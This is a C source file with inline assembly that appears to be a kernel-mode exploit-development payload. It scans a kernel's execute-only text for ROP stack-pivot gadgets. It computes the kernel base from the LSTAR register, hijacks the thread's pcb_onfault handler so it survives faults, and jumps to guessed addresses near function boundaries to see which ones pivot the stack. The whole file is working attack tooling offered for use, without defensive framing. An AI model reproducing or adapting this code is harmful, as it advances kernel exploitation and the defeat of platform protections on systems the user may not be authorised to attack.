#include <stdint.h>

/*
 * smart_pivot_scan v12 — Safe execute-test, one offset at a time
 *
 * v11 panicked because small-gap "boundaries" were mid-function
 * addresses where random instruction decoding hit RIP-relative
 * loads from ktext → EPT XO violation.
 *
 * v12 fixes this:
 *   1. Only test boundaries with gap ≥ 256 bytes (real functions)
 *   2. SCAN_BATCH selects the offset to test (same offset for all boundaries)
 *   3. Start with offset=1 (B-1, should be C3=ret, always safe)
 *      to VALIDATE boundaries before probing for gadgets
 *   4. Then offset=2 (B-2, the most likely pop rsp;ret location)
 *
 * Filtered boundaries (gap ≥ 256):
 *   [0] 0x290d08  (gap from prev: 0xd60)
 *   [1] 0x291d10  (gap: 0x1008)
 *   [2] 0x2932f8  (gap: 0x1598)
 *   [3] 0x29e2d8  (gap: 0xafe0)
 *   [4] 0x2a0858  (gap: 0x2580)
 *
 * SCAN_BATCH = offset to test (1-8). Default 1 = calibration.
 *
 * Output:
 *   [0] tag|magic
 *   [1] kdata_base
 *   [2] ktext_base
 *   [3] n_tested | offset<<16 | n_pivots<<32 | n_faults<<48
 *   [4] results packed: 4 bits per boundary (2=fault,1=pivot,0=normal)
 *       bits [3:0]=bound0, [7:4]=bound1, [11:8]=bound2, etc.
 *   [5] tested addresses: bound[0] addr
 *   [6] tested addresses: bound[1] addr
 *   [7] LSTAR
 */

#ifndef SCAN_BATCH
#define SCAN_BATCH     1     /* offset 1 = calibration (should be ret) */
#endif

#define MAGIC_SPVT     0x53505654
#define N_BOUNDS       5

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static volatile uint64_t g_saved_rsp;
static volatile uint64_t g_resume_rip;

__attribute__((naked))
static void fault_handler(void)
{
    __asm__ volatile(
        "movq g_saved_rsp(%%rip), %%rsp\n\t"
        "jmpq *g_resume_rip(%%rip)\n\t"
        ::: "memory"
    );
}

/*
 * Test if 'addr' behaves like a stack pivot.
 * rdi=addr, rsi=fake_stack_ptr (SysV ABI).
 * Returns: 0=not_pivot, 1=pivot, 2=fault
 */
__attribute__((naked, noinline))
static int test_pivot(uint64_t addr, uint64_t fake_stack_ptr)
{
    __asm__ volatile(
        "pushq %%rbx\n\t"
        "pushq %%r12\n\t"
        "pushq %%r13\n\t"
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"
        "pushq %%rbp\n\t"

        "movq %%rsp, g_saved_rsp(%%rip)\n\t"

        "leaq 30f(%%rip), %%rax\n\t"
        "movq %%rax, g_resume_rip(%%rip)\n\t"

        /* Fill fake_stack[0..7] with success label */
        "leaq 10f(%%rip), %%rax\n\t"
        "movq %%rax,   (%%rsi)\n\t"
        "movq %%rax,  8(%%rsi)\n\t"
        "movq %%rax, 16(%%rsi)\n\t"
        "movq %%rax, 24(%%rsi)\n\t"
        "movq %%rax, 32(%%rsi)\n\t"
        "movq %%rax, 40(%%rsi)\n\t"
        "movq %%rax, 48(%%rsi)\n\t"
        "movq %%rax, 56(%%rsi)\n\t"

        /* Test stack: [fake_stack, not_pivot×5] */
        "subq $48, %%rsp\n\t"
        "movq %%rsi, (%%rsp)\n\t"
        "leaq 20f(%%rip), %%rax\n\t"
        "movq %%rax,  8(%%rsp)\n\t"
        "movq %%rax, 16(%%rsp)\n\t"
        "movq %%rax, 24(%%rsp)\n\t"
        "movq %%rax, 32(%%rsp)\n\t"
        "movq %%rax, 40(%%rsp)\n\t"

        /* RBP = fake_stack for leave;ret detection */
        "movq %%rsi, %%rbp\n\t"

        "jmpq *%%rdi\n\t"

        "10:\n\t"  /* PIVOT */
        "movq g_saved_rsp(%%rip), %%rsp\n\t"
        "movl $1, %%eax\n\t"
        "jmp 40f\n\t"

        "20:\n\t"  /* NOT PIVOT */
        "movq g_saved_rsp(%%rip), %%rsp\n\t"
        "movl $0, %%eax\n\t"
        "jmp 40f\n\t"

        "30:\n\t"  /* FAULT */
        "movl $2, %%eax\n\t"

        "40:\n\t"
        "popq %%rbp\n\t"
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "popq %%r13\n\t"
        "popq %%r12\n\t"
        "popq %%rbx\n\t"
        "retq\n\t"
        ::: "memory"
    );
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;

    volatile uint64_t* out = (volatile uint64_t*)args;
    for (int i = 0; i < 2304 / 8; i++)
        out[i] = 0;

    out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_SPVT;
    out[1] = kdata_base;
    out[2] = ktext_base;

    /* pcb_onfault */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t pcb = *(volatile uint64_t*)(curthread + 0x3f8);
    volatile uint64_t *onfault = (volatile uint64_t *)(pcb + 0xb0);

    /* Fake stack in scratch area */
    volatile uint64_t *fake_stack = &out[200];

    /* Only real function boundaries (gap ≥ 256 bytes) */
    static const uint32_t bounds[N_BOUNDS] = {
        0x00290d08, 0x00291d10, 0x002932f8, 0x0029e2d8, 0x002a0858
    };

    int offset = SCAN_BATCH;  /* 1=calibration, 2+=gadget probing */
    if (offset < 1) offset = 1;
    if (offset > 8) offset = 8;

    int n_pivots = 0, n_faults = 0;
    uint32_t result_packed = 0;

    for (int b = 0; b < N_BOUNDS; b++) {
        uint64_t addr = ktext_base + bounds[b] - (uint64_t)offset;

        /* Arm pcb_onfault before each test */
        *onfault = (uint64_t)fault_handler;

        int r = test_pivot(addr, (uint64_t)fake_stack);

        /* Pack: 4 bits per boundary */
        result_packed |= ((uint32_t)(r & 0xF) << (b * 4));
        if (r == 1) n_pivots++;
        if (r == 2) n_faults++;
    }

    *onfault = 0;

    out[3] = (uint64_t)N_BOUNDS |
             ((uint64_t)offset << 16) |
             ((uint64_t)n_pivots << 32) |
             ((uint64_t)n_faults << 48);
    out[4] = result_packed;
    out[5] = ktext_base + bounds[0] - offset;  /* first tested addr */
    out[6] = ktext_base + bounds[1] - offset;  /* second tested addr */
    out[7] = lstar;

    out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
    return 0;
}
